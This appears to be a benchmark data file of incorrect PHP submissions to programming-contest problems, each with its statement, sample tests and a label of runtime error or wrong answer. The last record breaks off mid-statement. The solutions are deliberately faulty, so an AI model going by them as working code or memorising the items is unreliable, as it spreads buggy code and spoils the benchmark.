{"difficulty":800,"lang":"PHP","lang_cluster":"php","src_uid":"69850c2af99d60711bcff5870575e15e","submission_id":"re_1494","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n\n    $stdin = fopen('php:\/\/stdin', 'r');\n    $stdout = fopen('php:\/\/stdout', 'w');\n    \n    $n = fgets($stdin);\n    $weights = explode(\" \", fgets($stdin));\n    $wants = explode(\" \", fgets($stdin));\n    \n    $verdict = 0;\n    for($i=$wants[0];$i<$wants[1];++$i){\n        $verdict+=$weights[$i-1];\n    }  \n    \n    fputs($stdout, $verdict);\n?>","description":"The Berland Armed Forces System consists of n ranks that are numbered using natural numbers from 1 to n, where 1 is the lowest rank and n is the highest rank.One needs exactly di years to rise from rank i to rank i\u2009+\u20091. Reaching a certain rank i having not reached all the previous i\u2009-\u20091 ranks is impossible.Vasya has just reached a new rank of a, but he dreams of holding the rank of b. Find for how many more years Vasya should serve in the army until he can finally realize his dream.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100). The second line contains n\u2009-\u20091 integers di (1\u2009\u2264\u2009di\u2009\u2264\u2009100). The third input line contains two integers a and b (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009\u2264\u2009n). The numbers on the lines are space-separated.","output_spec":"Print the single number which is the number of years that Vasya needs to rise from rank a to rank b.","notes":null,"sample_inputs":["3\n5 6\n1 2","3\n5 6\n1 3"],"sample_outputs":["5","11"]}
{"difficulty":1300,"lang":"PHP","lang_cluster":"php","src_uid":"6cfd3b0a403212ec68bac1667bce9ef1","submission_id":"re_1168","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n$a = trim(fgets(STDIN));\n$b = array();\n$c = array();\n$d = array();\n$e = 0;\nfor($x = 0; $x < $a; $x++)\n{\n    list($f, $g) = explode(\" \", trim(fgets(STDIN)));\n    if($f == \"+\")\n    {\n        $e++;\n        array_push($c, $g);\n    }\n    else\n    {\n        $h = TRUE;\n        for($y = 0; $y < count($c); $y++)\n        {\n            if($c[$y] == $g)\n            {\n                $e--;\n                $h = FALSE;\n                unset($c[$y]);\n                break;\n            }\n        }\n        if($h == TRUE)\n        {\n            for($y = 0; $y < $x + 1; $y++)\n            {\n                $d[$y]++;\n            }\n        }\n    }\n    $b[$x] = $e;\n}\n$i = array();\nfor($x = 0; $x < $a; $x++)\n{\n    $i[$x] = $b[$x] + $d[$x];\n}\nprint max($i);\n?>","description":"Berland National Library has recently been built in the capital of Berland. In addition, in the library you can take any of the collected works of Berland leaders, the library has a reading room.Today was the pilot launch of an automated reading room visitors' accounting system! The scanner of the system is installed at the entrance to the reading room. It records the events of the form \"reader entered room\", \"reader left room\". Every reader is assigned a registration number during the registration procedure at the library \u2014 it's a unique integer from 1 to 106. Thus, the system logs events of two forms:  \"+ ri\" \u2014 the reader with registration number ri entered the room;  \"- ri\" \u2014 the reader with registration number ri left the room. The first launch of the system was a success, it functioned for some period of time, and, at the time of its launch and at the time of its shutdown, the reading room may already have visitors.Significant funds of the budget of Berland have been spent on the design and installation of the system. Therefore, some of the citizens of the capital now demand to explain the need for this system and the benefits that its implementation will bring. Now, the developers of the system need to urgently come up with reasons for its existence.Help the system developers to find the minimum possible capacity of the reading room (in visitors) using the log of the system available to you.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of records in the system log. Next follow n events from the system journal in the order in which the were made. Each event was written on a single line and looks as \"+ ri\" or \"- ri\", where ri is an integer from 1 to 106, the registration number of the visitor (that is, distinct visitors always have distinct registration numbers). It is guaranteed that the log is not contradictory, that is, for every visitor the types of any of his two consecutive events are distinct. Before starting the system, and after stopping the room may possibly contain visitors.","output_spec":"Print a single integer \u2014 the minimum possible capacity of the reading room.","notes":"NoteIn the first sample test, the system log will ensure that at some point in the reading room were visitors with registration numbers 1, 1200 and 12001. More people were not in the room at the same time based on the log. Therefore, the answer to the test is 3.","sample_inputs":["6\n+ 12001\n- 12001\n- 1\n- 1200\n+ 1\n+ 7","2\n- 1\n- 2","2\n+ 1\n- 1"],"sample_outputs":["3","2","1"]}
{"difficulty":1000,"lang":"PHP","lang_cluster":"php","src_uid":"6e0dafeaf85e92f959c388c72e158f68","submission_id":"re_859","tags":["constructive algorithms","*special"],"exec_outcome":"WRONG_ANSWER","source_code":"<?\n\/\/ test 1\n\n$a = explode(' ', fgets(STDIN));\n\n$a['0'] = (int) $a['0'];\n$a['1'] = (int) $a['1'];\n$a['2'] = (int) $a['2'];\n\n($b = $a['1'] * $a['2']) - $a['0'] < 0 && die('-1');\n\nfor($u = 1, $i = 1; $i <= $b; $i++)\n{\n\nif($i <= $a['0'])\n{\n\nif($a['2'] % 2 == 0)\n{\n\nif($u % 2 == 0)\n{\n$c[$i] = $i+1;\n$c[$i+1] = $i;\n$i++;\n}\nelse $c[$i] = $i;\n\nif($i % $a['2'] == 0) $u++;\n\n}\n\nelse $c[$i] = $i;\n\n}\n\nelse $c[$i] = 0;\n\n}\n\nforeach($c as $d => $e) print $e.($d % $a['2'] == 0 && $d != $b ? \"\\n\":' ');\n","description":"There are n parliamentarians in Berland. They are numbered with integers from 1 to n. It happened that all parliamentarians with odd indices are Democrats and all parliamentarians with even indices are Republicans.New parliament assembly hall is a rectangle consisting of a\u2009\u00d7\u2009b chairs\u00a0\u2014 a rows of b chairs each. Two chairs are considered neighbouring if they share as side. For example, chair number 5 in row number 2 is neighbouring to chairs number 4 and 6 in this row and chairs with number 5 in rows 1 and 3. Thus, chairs have four neighbours in general, except for the chairs on the border of the hallWe know that if two parliamentarians from one political party (that is two Democrats or two Republicans) seat nearby they spent all time discussing internal party issues.Write the program that given the number of parliamentarians and the sizes of the hall determine if there is a way to find a seat for any parliamentarian, such that no two members of the same party share neighbouring seats.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n, a and b (1\u2009\u2264\u2009n\u2009\u2264\u200910\u2009000, 1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009100)\u00a0\u2014 the number of parliamentarians, the number of rows in the assembly hall and the number of seats in each row, respectively.","output_spec":"If there is no way to assigns seats to parliamentarians in a proper way print -1. Otherwise print the solution in a lines, each containing b integers. The j-th integer of the i-th line should be equal to the index of parliamentarian occupying this seat, or 0 if this seat should remain empty. If there are multiple possible solution, you may print any of them.","notes":"NoteIn the first sample there are many other possible solutions. For example, 3 20 1and 2 13 0The following assignment 3 21 0is incorrect, because parliamentarians 1 and 3 are both from Democrats party but will occupy neighbouring seats.","sample_inputs":["3 2 2","8 4 3","10 2 2"],"sample_outputs":["0 3\n1 2","7 8 3\n0 1 4\n6 0 5\n0 2 0","-1"]}
{"difficulty":1100,"lang":"PHP","lang_cluster":"php","src_uid":"6f6859aabc1c9cbb9ee0d910064d87c2","submission_id":"re_1156","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n$a = trim(fgets(STDIN));\n$b = trim(fgets(STDIN));\nif(strlen($b) % 2 == 0)\n{\n    $c = str_split($b, 2);\n    print implode(\"-\", $c);\n}\nelse\n{\n    $c = substr($b, 0, 3);\n    $d = substr($b, 3);\n    $e = str_split($d, 2);\n    print $c . \"-\" . implode(\"-\", $e);\n}\n?>","description":"Phone number in Berland is a sequence of n digits. Often, to make it easier to memorize the number, it is divided into groups of two or three digits. For example, the phone number 1198733 is easier to remember as 11-987-33. Your task is to find for a given phone number any of its divisions into groups of two or three digits.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of digits in the phone number. The second line contains n digits \u2014 the phone number to divide into groups.","output_spec":"Output any of divisions of the given phone number into groups of two or three digits. Separate groups by single character -. If the answer is not unique, output any.","notes":null,"sample_inputs":["6\n549871","7\n1198733"],"sample_outputs":["54-98-71","11-987-33"]}
{"difficulty":800,"lang":"PHP","lang_cluster":"php","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_1537","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\nfunction go($who, $num, $n)\n{\n    if ($num==$n)\n        return;\n    if ($num>1)\n        printf(\" \");\n    printf(\"%d\",$who);\n    go(($who+$num+1)%(int)$n,$num+1, $n);\n}\n$file=fopen(\"input.txt\",\"r\");\n$n=fgets($file);\ngo(2,1,$n);\nprintf(\"\\n\");\n?>","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1300,"lang":"PHP","lang_cluster":"php","src_uid":"88d56c1e3a7ffa94354ce0c70d8e958f","submission_id":"re_1521","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n\n###### IO ######\nerror_reporting(E_ALL);\nerror_reporting(0);\n\nfunction readString($f) {\n\t$r = array(\n\t\t\"\\r\" => '',\n\t\t\"\\n\" => '',\n\t);\n\treturn strtr(fgets($f), $r);\n}\n\nfunction readNumString($f) {\n\treturn trim(fgets($f));\n}\n\nfunction stringToArray($str) {\n\treturn str_split($str);\n}\n\nfunction readNum($f, $is_int = false) {\n\t$v = readNumString($f);\n\treturn $is_int ? intval($v) : floatval($v);\n}\n\nfunction readStringExplode($f, $delimiter = ' ') {\n\t$v = readNumString($f);\n\tif ($delimiter == '') {\n\t\t$return = stringToArray($v);\n\t} else {\n\t\t$return = explode($delimiter, $v);\n\t}\n\t$callf = 'trim';\n\treturn array_map($callf, $return);\n}\n\nfunction readStringExplodeNum($f, $delimiter = ' ', $is_int = false) {\n\t$v = readNumString($f);\n\tif ($delimiter == '') {\n\t\t$return = stringToArray($v);\n\t} else {\n\t\t$return = explode($delimiter, $v);\n\t}\n\t$callf = $is_int ? 'intval' : 'floatval';\n\treturn array_map($callf, $return);\n}\n\n###### \/IO ######\n\nfunction diffCnt($baseTime, $time) {\n\t$return = 0;\n\tfor ($i = 0; $i < 5; $i++) {\n\t\tif ($baseTime[$i] != $time[$i]) {\n\t\t\t$return++;\n\t\t}\n\t}\n\treturn $return;\n}\n\nfunction getAnswer($is_test = false, $f = false) {\n\t$stream = STDIN;\n\tif ($is_test)\n\t\t$stream = $f;\n\t\/* begin body *\/\n\t$format = readNum($stream);\n\t$baseTime = readString($stream);\n\t$answer = array(\n\t\t'res' => '',\n\t\t'diff' => 55,\n\t);\n\t$minHour = 0;\n\t$maxHour = 23;\n\tif ($format == 12) {\n\t\t$minHour = 1;\n\t\t$maxHour = 12;\n\t}\n\tfor ($hour = $minHour; $hour < $maxHour; $hour++) {\n\t\tfor ($minute = 0; $minute < 60; $minute++) {\n\t\t\t$checkHour = $hour;\n\t\t\twhile (strlen($checkHour) < 2)\n\t\t\t\t$checkHour = '0' . $checkHour;\n\t\t\t$checkMinute = $minute;\n\t\t\twhile (strlen($checkMinute) < 2)\n\t\t\t\t$checkMinute = '0' . $checkMinute;\n\t\t\t$checkTime = \"{$checkHour}:{$checkMinute}\";\n\t\t\t$diff = diffCnt($baseTime, $checkTime);\n\t\t\tif ($diff < $answer['diff']) {\n\t\t\t\t$answer['diff'] = $diff;\n\t\t\t\t$answer['res'] = $checkTime;\n\t\t\t}\n\t\t}\n\t}\n\techo $answer['res'];\n\t\/* \/ end body *\/\n}\n\nif (empty($is_test))\n\tgetAnswer();","description":"You are given a broken clock. You know, that it is supposed to show time in 12- or 24-hours HH:MM format. In 12-hours format hours change from 1 to 12, while in 24-hours it changes from 0 to 23. In both formats minutes change from 0 to 59.You are given a time in format HH:MM that is currently displayed on the broken clock. Your goal is to change minimum number of digits in order to make clocks display the correct time in the given format.For example, if 00:99 is displayed, it is enough to replace the second 9 with 3 in order to get 00:39 that is a correct time in 24-hours format. However, to make 00:99 correct in 12-hours format, one has to change at least two digits. Additionally to the first change one can replace the second 0 with 1 and obtain 01:39.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one integer 12 or 24, that denote 12-hours or 24-hours format respectively. The second line contains the time in format HH:MM, that is currently displayed on the clock. First two characters stand for the hours, while next two show the minutes.","output_spec":"The only line of the output should contain the time in format HH:MM that is a correct time in the given format. It should differ from the original in as few positions as possible. If there are many optimal solutions you can print any of them.","notes":null,"sample_inputs":["24\n17:30","12\n17:30","24\n99:99"],"sample_outputs":["17:30","07:30","09:09"]}
{"difficulty":1200,"lang":"PHP","lang_cluster":"php","src_uid":"94a38067fc8dd8619fa6e5873ca60220","submission_id":"re_1524","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n$cntInput = fgets(STDIN);\n$arInput =  explode(' ',trim(fgets(STDIN)));\nfor($i=0;$i<$cntInput;$i++){\n    for($k=$i+1;$k<$cntInput;$k++){\n        $rkey = array_search($arInput[$i]+$arInput[$k],$arInput);\n        if ($rkey>0){\n            echo ($rkey+1).' '.($i+1).' '.($k+1);\n            exit;\n        }\n    }\n}\necho -1;\n\n?>","description":"Professor Vasechkin is studying evolution of worms. Recently he put forward hypotheses that all worms evolve by division. There are n forms of worms. Worms of these forms have lengths a1, a2, ..., an. To prove his theory, professor needs to find 3 different forms that the length of the first form is equal to sum of lengths of the other two forms. Help him to do this.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (3\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of worm's forms. The second line contains n space-separated integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20091000) \u2014 lengths of worms of each form.","output_spec":"Output 3 distinct integers i j k (1\u2009\u2264\u2009i,\u2009j,\u2009k\u2009\u2264\u2009n) \u2014 such indexes of worm's forms that ai\u2009=\u2009aj\u2009+\u2009ak. If there is no such triple, output -1. If there are several solutions, output any of them. It possible that aj\u2009=\u2009ak.","notes":null,"sample_inputs":["5\n1 2 3 5 7","5\n1 8 1 5 1"],"sample_outputs":["3 2 1","-1"]}
{"difficulty":1400,"lang":"PHP","lang_cluster":"php","src_uid":"991516fa6f3ed5a71c547a3a50ea1a2b","submission_id":"re_1051","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\nlist($a, $b) = explode(\" \", trim(fgets(STDIN)));\n$c = explode(\" \", trim(fgets(STDIN)));\n$e = array();\nfor($x = 0; $x < $a; $x++)\n{\n    $d = floor($c[$x] \/ $b);\n    array_push($e, $d);\n}\n$f = array_sum($e) * $b;\nprint $f;\n?>","description":"The blinds are known to consist of opaque horizontal stripes that can be rotated thus regulating the amount of light flowing in the room. There are n blind stripes with the width of 1 in the factory warehouse for blind production. The problem is that all of them are spare details from different orders, that is, they may not have the same length (it is even possible for them to have different lengths)Every stripe can be cut into two or more parts. The cuttings are made perpendicularly to the side along which the length is measured. Thus the cuttings do not change the width of a stripe but each of the resulting pieces has a lesser length (the sum of which is equal to the length of the initial stripe)After all the cuttings the blinds are constructed through consecutive joining of several parts, similar in length, along sides, along which length is measured. Also, apart from the resulting pieces an initial stripe can be used as a blind if it hasn't been cut. It is forbidden to construct blinds in any other way.Thus, if the blinds consist of k pieces each d in length, then they are of form of a rectangle of k\u2009\u00d7\u2009d bourlemeters. Your task is to find for what window possessing the largest possible area the blinds can be made from the given stripes if on technical grounds it is forbidden to use pieces shorter than l bourlemeter. The window is of form of a rectangle with side lengths as positive integers.","input_from":"standard input","output_to":"standard output","input_spec":"The first output line contains two space-separated integers n and l (1\u2009\u2264\u2009n,\u2009l\u2009\u2264\u2009100). They are the number of stripes in the warehouse and the minimal acceptable length of a blind stripe in bourlemeters. The second line contains space-separated n integers ai. They are the lengths of initial stripes in bourlemeters (1\u2009\u2264\u2009ai\u2009\u2264\u2009100).","output_spec":"Print the single number \u2014 the maximal area of the window in square bourlemeters that can be completely covered. If no window with a positive area that can be covered completely without breaking any of the given rules exist, then print the single number 0.","notes":"NoteIn the first sample test the required window is 2\u2009\u00d7\u20094 in size and the blinds for it consist of 4 parts, each 2 bourlemeters long. One of the parts is the initial stripe with the length of 2, the other one is a part of a cut stripe with the length of 3 and the two remaining stripes are parts of a stripe with the length of 4 cut in halves.","sample_inputs":["4 2\n1 2 3 4","5 3\n5 5 7 3 1","2 3\n1 2"],"sample_outputs":["8","15","0"]}
{"difficulty":1100,"lang":"PHP","lang_cluster":"php","src_uid":"b1ef19d7027dc82d76859d64a6f43439","submission_id":"re_693","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n$a = trim(fgets(STDIN));\n$b = trim(fgets(STDIN));\n$c = str_split($a);\n$d = str_split($b);\nfor($x = 0; $x < count($c); $x++)\n{\n    if($c[$x] == \" \")\n    {\n        continue;\n    }\n    else\n    {\n        for($y = 0; $y < count($d); $y++)\n        {\n            if($c[$x] == $d[$y])\n            {\n                unset($d[$y]);\n                sort($d);\n            }\n        }\n    }\n}\n$e = array_unique($d);\nsort($e);\nif((count($e) == 0) || ((count($e) == 1) && ($e[0] == \" \")))\n{\n    print \"YES\";\n}\nelse\n{\n    print \"NO\";\n}\n?>","description":"Vasya decided to write an anonymous letter cutting the letters out of a newspaper heading. He knows heading s1 and text s2 that he wants to send. Vasya can use every single heading letter no more than once. Vasya doesn't have to cut the spaces out of the heading \u2014 he just leaves some blank space to mark them. Help him; find out if he will manage to compose the needed text.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a newspaper heading s1. The second line contains the letter text s2. s1 \u0438 s2 are non-empty lines consisting of spaces, uppercase and lowercase Latin letters, whose lengths do not exceed 200 symbols. The uppercase and lowercase letters should be differentiated. Vasya does not cut spaces out of the heading.","output_spec":"If Vasya can write the given anonymous letter, print YES, otherwise print NO","notes":null,"sample_inputs":["Instead of dogging Your footsteps it disappears but you dont notice anything\nwhere is your dog","Instead of dogging Your footsteps it disappears but you dont notice anything\nYour dog is upstears","Instead of dogging your footsteps it disappears but you dont notice anything\nYour dog is upstears","abcdefg hijk\nk j i h g f e d c b a"],"sample_outputs":["NO","YES","NO","YES"]}
{"difficulty":1000,"lang":"PHP","lang_cluster":"php","src_uid":"bd5912fe2c5c37658f28f6b159b39645","submission_id":"re_1506","tags":["implementation","greedy","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n\n$l = trim(fgets(STDIN));\n$r = trim(fgets(STDIN));\n\n\/\/ base case sanity check\nif($r > strlen($l))\n{\n    echo \"impossible\";\n    exit;\n}\n\n$cc = array();\nforeach(str_split($l) as $c) {\n    if (!isset($cc[$c]))\n        $cc[$c] = true;\n}\n\necho ($r - sizeof($cc));","description":"Calculate the minimum number of characters you need to change in the string s, so that it contains at least k different letters, or print that it is impossible.String s consists only of lowercase Latin letters, and it is allowed to change characters only to lowercase Latin letters too.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains string s, consisting only of lowercase Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u20091000, |s| denotes the length of s). Second line of input contains integer k (1\u2009\u2264\u2009k\u2009\u2264\u200926).","output_spec":"Print single line with a minimum number of necessary changes, or the word \u00abimpossible\u00bb (without quotes) if it is impossible.","notes":"NoteIn the first test case string contains 6 different letters, so we don't need to change anything.In the second test case string contains 4 different letters: {'a',\u2009'h',\u2009'o',\u2009'y'}. To get 5 different letters it is necessary to change one occurrence of 'o' to some letter, which doesn't occur in the string, for example, {'b'}.In the third test case, it is impossible to make 7 different letters because the length of the string is 6.","sample_inputs":["yandex\n6","yahoo\n5","google\n7"],"sample_outputs":["0","1","impossible"]}
{"difficulty":1000,"lang":"PHP","lang_cluster":"php","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_1307","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\n\n\/\/class Room {\n\/\/\n\/\/    public $h, $len;\n\/\/\n\/\/    public function __construct($a, $b, $h) {\n\/\/        $this->h = $h;\n\/\/        $this->len = 2 * ($a + $b);\n\/\/    }\n\/\/\n\/\/}\n\/\/\n\/\/class Page {\n\/\/\n\/\/    public $a, $b, $p;\n\/\/\n\/\/    public function __construct($a, $b, $p) {\n\/\/        $this->a = $a;\n\/\/        $this->b = $b;\n\/\/        $this->p = $p;\n\/\/    }\n\/\/\n\/\/}\n\/\/\n\/\/function getPrice($room, $page) {\n\/\/    $piece = (int)($page -> a \/ $room->h);\n\/\/    if($piece<=0)\n\/\/        return 99999999;\n\/\/    $wide = $piece * $page -> b;\n\/\/\n\/\/    $yu_len = $room->len % $wide;\n\/\/    $rolls = (int)($room->len \/ $wide) + ($yu_len != 0 ? 1 : 0);\n\/\/    return $rolls * $page->p;\n\/\/}\n\/\/\n\/\/$room = array();\n\/\/$page = array();\n$fr = fopen(\"php:\/\/stdin\", \"r\");\n$n = (int) fgets($fr);\n$arr = fgets($fr);\nfclose($fr);\n$arr = explode(' ', $arr);\n$ary = array();\n\nforeach ($arr as $value) {\n    $value=(int)$value;\n    $ary[$value2] = 1;\n}\n$cnt = 0;\nfor ($i = 1; $i <= $n; ++$i) {\n    if ($ary[$i] == NULL){\n\/\/        echo \"haha\";\n        $cnt++;\n    }\n}\necho $cnt;\n\n\/\/\n\/\/for ($i = 0; $i < $rooms; ++$i) {\n\/\/    fscanf(STDIN, \"%d%d%d\", $a, $b, $h);\n\/\/    array_push($room, new Room($a, $b, $h));\n\/\/}\n\/\/\n\/\/fscanf(STDIN, \"%d\", $pages);\n\/\/for ($i = 0; $i < $pages; ++$i) {\n\/\/    fscanf(STDIN, \"%d%d%d\", $a, $b, $p);\n\/\/    array_push($page, new Page($a, $b, $p));\n\/\/}\n\/\/\n\/\/$sum=0;\n\/\/\n\/\/foreach ($room as $rm) {\n\/\/    $min=99999999;\n\/\/    foreach ($page as $pg) {\n\/\/        $price=getPrice($rm, $pg);\n\/\/        if($price<$min)\n\/\/            $min=$price;\n\/\/    }\n\/\/    $sum+=$min;\n\/\/}\n\/\/echo $sum;\n\/\/\n\/\/usort($a, 'cmp');\n\/\/$b = Array();\n\/\/foreach ($a as $ai) {\n\/\/    $l = 0;\n\/\/    $r = count($b);\n\/\/    while ($l < $r) {\n\/\/        $m = ($l + $r) \/ 2;\n\/\/        if ($ai->h > $b[$m]->h) {\n\/\/            $l = $m + 1;\n\/\/        } else {\n\/\/            $r = $m;\n\/\/        }\n\/\/    }\n\/\/    $ai->p = ($r == 0 ? NULL : $b[$r - 1]);\n\/\/    $b[$r] = $ai;\n\/\/}\n\/\/\n\/\/echo count($b) . \"\\n\";\n\/\/if (count($b) > 0) {\n\/\/    $c = Array();\n\/\/    for ($p = array_pop($b); $p != NULL; $p = $p->p) {\n\/\/        array_unshift($c, $p->i);\n\/\/    }\n\/\/    print implode($c, ' ') . \"\\n\";\n\/\/}","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"PHP","lang_cluster":"php","src_uid":"c31fed523230af1f904218b2fe0d663d","submission_id":"re_950","tags":["implementation","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"<?php\nlist($a, $b) = explode(\" \", trim(fgets(STDIN)));\n$e = array();\n$f = array();\n$i = array();\n$k = array();\nfor($x = 1; $x <= $a; $x++)\n{\n    list($c, $d) = explode(\" \", trim(fgets(STDIN)));\n    array_push($e, $c);\n    array_push($f, $d);\n}\nasort($e);\n$m = array_keys($e);\n$n = array_combine($m, $f);\nsort($e);\nsort($n);\nfor($x = 0; $x < $a; $x++)\n{\n    $g = $e[$x] - $n[$x] \/ 2;\n    $h = $e[$x - 1] + $n[$x - 1] \/ 2;\n    array_push($i, $g - $h);\n}\n$i = array_slice($i, 1);\nfor($x = 0; $x < count($i); $x++)\n{\n    if(($i[$x] \/ $b) < 1)\n    {\n        continue;\n    }\n    else\n    {\n        $j = ceil($i[$x] \/ $b);\n        if($j > 2)\n        {\n            $j = 2;\n        }\n        array_push($k, $j);\n    }\n}\n$l = array_sum($k);\nprint $l + 2;\n?>","description":"A new cottage village called \u00abFlatville\u00bb is being built in Flatland. By now they have already built in \u00abFlatville\u00bb n square houses with the centres on the \u041ex-axis. The houses' sides are parallel to the coordinate axes. It's known that no two houses overlap, but they can touch each other.The architect bureau, where Peter works, was commissioned to build a new house in \u00abFlatville\u00bb. The customer wants his future house to be on the \u041ex-axis, to be square in shape, have a side t, and touch at least one of the already built houses. For sure, its sides should be parallel to the coordinate axes, its centre should be on the Ox-axis and it shouldn't overlap any of the houses in the village.Peter was given a list of all the houses in \u00abFlatville\u00bb. Would you help him find the amount of possible positions of the new house?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains numbers n and t (1\u2009\u2264\u2009n,\u2009t\u2009\u2264\u20091000). Then there follow n lines, each of them contains two space-separated integer numbers: xi ai, where xi \u2014 x-coordinate of the centre of the i-th house, and ai \u2014 length of its side (\u2009-\u20091000\u2009\u2264\u2009xi\u2009\u2264\u20091000, 1\u2009\u2264\u2009ai\u2009\u2264\u20091000).","output_spec":"Output the amount of possible positions of the new house.","notes":"NoteIt is possible for the x-coordinate of the new house to have non-integer value.","sample_inputs":["2 2\n0 4\n6 2","2 2\n0 4\n5 2","2 3\n0 4\n5 2"],"sample_outputs":["4","3","2"]}
{"difficulty":1200,"lang":"PHP","lang_cluster":"php","src_uid":"c3244e952830643938d51ce14f043d7d","submission_id":"re_1355","tags":["strings"],"exec_outcome":"WRONG_ANSWER","source_code":"<?php\n\n###### IO ######\nerror_reporting(E_ALL);\n#error_reporting(0);\n\nfunction readString($f) {\n\t$r = array(\n\t\t\"\\r\" => '',\n\t\t\"\\n\" => '',\n\t);\n\treturn strtr(fgets($f), $r);\n}\n\nfunction readNumString($f) {\n\treturn trim(fgets($f));\n}\n\nfunction stringToArray($str) {\n\treturn str_split($str);\n}\n\nfunction readNum($f, $is_int = false) {\n\t$v = readNumString($f);\n\treturn $is_int ? intval($v) : floatval($v);\n}\n\nfunction readStringExplode($f, $delimiter = ' ') {\n\t$v = readNumString($f);\n\tif ($delimiter == '') {\n\t\t$return = stringToArray($v);\n\t} else {\n\t\t$return = explode($delimiter, $v);\n\t}\n\t$callf = 'trim';\n\treturn array_map($callf, $return);\n}\n\nfunction readStringExplodeNum($f, $delimiter = ' ', $is_int = false) {\n\t$v = readNumString($f);\n\tif ($delimiter == '') {\n\t\t$return = stringToArray($v);\n\t} else {\n\t\t$return = explode($delimiter, $v);\n\t}\n\t$callf = $is_int ? 'intval' : 'floatval';\n\treturn array_map($callf, $return);\n}\n\n###### \/IO ######\n\nfunction getAnswer($is_test = false, $f = false) {\n\tif ($is_test === false) {\n\t\t$f = STDIN;\n\t}\n\t\/* begin body *\/\n\t$path = readString($f);\n\t$t1 = readString($f);\n\t$t2 = readString($f);\n\n\t$isForward = false;\n\t$i1 = strpos($path, $t1);\n\tif ($i1 !== false && strpos($path, $t2, $i1 + 1) !== false) {\n\t\t$isForward = true;\n\t}\n\n\t$isBack = false;\n\t$path = strrev($path);\n\t$i1 = strpos($path, $t1);\n\tif ($i1 !== false && strpos($path, $t2, $i1 + 1) !== false) {\n\t\t$isBack = true;\n\t}\n\n\tif ($isForward && $isBack) {\n\t\techo 'both';\n\t} elseif ($isForward) {\n\t\techo 'forward';\n\t} elseif ($isBack) {\n\t\techo 'backward';\n\t} else {\n\t\techo 'fantasy';\n\t}\n\t\/* \/ end body *\/\n}\n\nif (empty($is_test))\n\tgetAnswer();","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular 